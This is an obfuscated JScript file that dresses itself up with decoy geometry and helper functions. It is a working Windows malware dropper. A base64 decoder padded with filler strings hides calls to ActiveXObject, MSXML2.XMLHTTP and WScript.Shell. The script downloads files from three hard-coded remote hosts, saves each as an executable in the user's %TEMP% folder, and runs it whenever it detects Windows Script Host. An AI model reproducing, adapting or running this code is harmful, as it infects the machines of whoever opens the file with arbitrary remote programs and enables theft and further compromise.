
var baltimore = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  bruges = [];
var erudition = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};var abbreviation = 0;
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function tortoise(thoroughness) {
	empirical = thoroughness;
	for (var i in erudition){empirical = empirical.replace(i, erudition[i]);}
    return empirical;
};

var computation = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.tortoise4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("analyse").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = baltimore[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = baltimore[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = baltimore[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = baltimore[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var stored ="analyseJVanalyseRFTVanalyseAl".tortoise4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var charitable = "analyseQWanalyseN0aXZanalyselWE9iaanalysemVjdA=analyse=".tortoise4();
String.prototype.tortoise2 = function () {
    var gaslight = {
        pours: this
    };
    gaslight.commissioner = gaslight.pours["c3Vic3RyaW5n".tortoise4()](abbreviation, computation);
    return gaslight.commissioner;
};

var snipe ="analyseRXhwYW5analysekRW52aXanalyseJvbm1lbnRTdHJanalysepbmdz".tortoise4();
var Native = function(options){
	
};
var visited = [charitable, snipe,stored,  ""+"."+("nationwide","foxes","classics","translation","primer","assessments","celebs","entities","exe"), "UnVu".tortoise4(), tortoise("M"+"SX"+"ML"+("reliable","fealty","friesland","milliner","lancashire","literature","plover","2.")+"|M"+"LH"+"TT"+("chances","changing","nuclear","sacred","zechariah","freeze","morrison","staying","P>")+"WU"+("donor","outspoken","thrive","staying","catering","wizard","delectable","cr")+("backing","disrespect","lives","escort","writers","japanese","bestiality","coalition","ip")+"t:"+("entering","handheld","ebooks","upturned","sewed","disciplined","academical","liver","Sh")+"ell")];
armature = "_F2_";
var justin = this[visited.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
VlLmALNYw = "jzUuEbmOvV";
virulent = (("railway", "reaction", "fathers", "digit", "entering", "preparation", "framework", "plINDsw") + "wtLMRHAEN").tortoise2();
kinds = (("immaculate", "algeria", "quizzes", "downloadable", "cases", "investment", "eddies", "inopportune", "hexameter", "sQmmbpv") + "tgmlhO").tortoise2();
  
    String.prototype.footpath = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var piedmont = visited.pop().split(">");

trellis = "b3Blbg==".tortoise4();
var tennis = new justin(piedmont[1]);
var sponsor = new justin(piedmont[0]);
var mechanisms = tennis[visited.shift()](visited.shift());
weasel = (("scamp", "intelligence", "certitude", "agent", "EloAKBXHi") + "nCdYvHn").tortoise2();

var pronunciation = visited.shift();
var lilac = visited.shift();
function kenneth(primarily, stacy) {

    try {
        var notices = mechanisms + "/" + stacy ;
		notices = notices+ pronunciation;
            sponsor[trellis](("spotlight","conditional","G" + weasel) + ("substantive","detract","enemy","compression","T"), primarily, false);
       
    YnhWjJfUmKk = "_F7_";
    sponsor[kinds + ("damnable","validity","end")]();
	var palliate=(WScript+"virulent"=="V2luZG93cyBTY3JpcHQgSG9zdA==".tortoise4()+"virulent")&&sponsor["c3RhdHVz".tortoise4()] +""=="MjAw".tortoise4()&&typeof(kppDnAD)==="undefined";
	lQHNgR = "_F8_";
    if (palliate) {
		
        var chronological = new justin((("leafless","loquacity","indexes","avaricious","contingent","leaven","purveyor","destinations","A")+("truncheon","saddened","fisheries","moths","showy","linden","fiftieth","brook","SEOO")+"DB"+("animating","soonest","interventions","coyote","grande","thistle","trinity",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        chronological[trellis]();
        OcPwIV = "_F9_";
        chronological.type = computation;
        ymwFLRrlTHz = "_F10_";
        chronological["d3JpdGU=".tortoise4()](sponsor[("centres","institution","singles","bangbus","gives","libel","permissible","")+"R"+"es"+"pon"+erudition['U'].toLowerCase()+"e"+"Qm9keQ==".tortoise4()]);
        EuOpmx = "_F11_";
        chronological[(virulent + "o"+("compatriot","suffered","deviant","industrial","catering","technical","barbie","bothered","00")+("spine","gregory","drummer","basement","antibodies","receptacle","blame","8i")+"tion").replace("0"+("fixed","deferred","korea","eyewitness","acquittal","purveyor","concurrence","08"), kinds)] = 0;
        eXmzKUdheVw = "_F12_";
        chronological[("coordination","adaptation","emetic","astounding","bluntly","hopper","cumshot","s")+"aveT"+"oF"+"ile"](notices, 2);
        omJGIPeysR = "_F13_";
        chronological.close();
        vUNyYL = "_F14_";
		tennis[lilac](notices, computation, true);
    }
} catch (MCYLRblLLKH) { };

    npwWlOTNgz = "_F15_";
}
try{
kenneth("aHR0cDovLw==".tortoise4()+"\u0072\u0075\u0073\u0072\u0073"+"\u002E\u0072\u0075\u002F\u0073\u0064\u0066\u0067\u0034\u0067\u0033" + "?XDmTQE=veveiSKBuIu","dtQGEMXWCIe");}catch(SnvaiFgthOo){}

try{
kenneth("aHR0cDovLw==".tortoise4()+"\u0073\u0076\u0065\u0069\u006B\u0061\u0074\u0061\u002D\u006A\u0075\u006D"+"\u0073\u002E\u006C\u0074\u002F\u0036\u0035\u0067\u0034\u0033\u0034\u0066" + "?pigCmIuks=vNhWGgS","tLYxlTxJt");}catch(CbOoenqwGu){}
kenneth("aHR0cDovLw==".tortoise4()+"\u0062\u0061\u006C\u0074\u0065\u006C\u0061"+"\u002E\u006C\u0074\u002F\u0034\u0033\u0034\u0035\u0034\u0079\u0074\u0033\u0032" + "?SoTDIRGSkX=AAuBCRVlfCp","GruhISFkz");
   VzxfSBcP = "_F16_";
   